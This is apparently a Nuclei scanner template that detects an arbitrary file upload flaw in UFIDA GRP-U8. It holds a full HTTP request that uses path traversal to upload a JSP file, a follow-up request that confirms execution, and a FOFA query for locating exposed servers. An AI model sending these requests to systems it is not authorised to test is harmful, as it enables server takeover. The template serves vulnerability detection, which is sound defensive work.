http:
- matchers:
  - condition: and
    dsl:
    - status_code_1 == 200 && contains(body_1,'showSucceedMsg')
    - status_code_2 == 200 && contains(body_2,'{{randstr_2}}')
    type: dsl
  raw:
  - 'POST /UploadFileData?action=upload_file&filename=../{{randstr_1}}.jsp HTTP/1.1

    Host: {{Hostname}}

    Content-Length: 327

    Accept: */*

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqoqnjtcw

    Accept-Encoding: gzip


    ------WebKitFormBoundaryqoqnjtcw

    Content-Disposition: form-data; name="upload"; filename="emgeyr.jsp"

    Content-Type: application/octet-stream


    <% {out.print("{{randstr_2}}");} %>

    ------WebKitFormBoundaryqoqnjtcw

    Content-Disposition: form-data; name="submit"


    submit

    ------WebKitFormBoundaryqoqnjtcw--

    '
  - 'GET /R9iPortal/{{randstr_1}}.jsp HTTP/1.1

    Host: {{Hostname}}

    Accept-Encoding: gzip

    '
id: grp-u8-uploadfiledata
info:
  author: SleepingBag945
  description: 'File upload vulnerability in UFIDA U8+ERP customer relationship management
    software. An attacker can use this vulnerability to gain control of the server.

    '
  metadata:
    fofa-query: "title=\"\u7528\u53CBGRP-U8\u884C\u653F\u4E8B\u4E1A\u5185\u63A7\u7BA1\
      \u7406\u8F6F\u4EF6\""
    max-request: 2
    verified: true
  name: UFIDA GRP-U8 UploadFileData - Arbitrary File Upload
  reference:
  - https://mp.weixin.qq.com/s/DZXFxLC7fFKbPUWrdyITag
  severity: critical
  tags: yonyou,fileupload,grp,intrusive,vuln
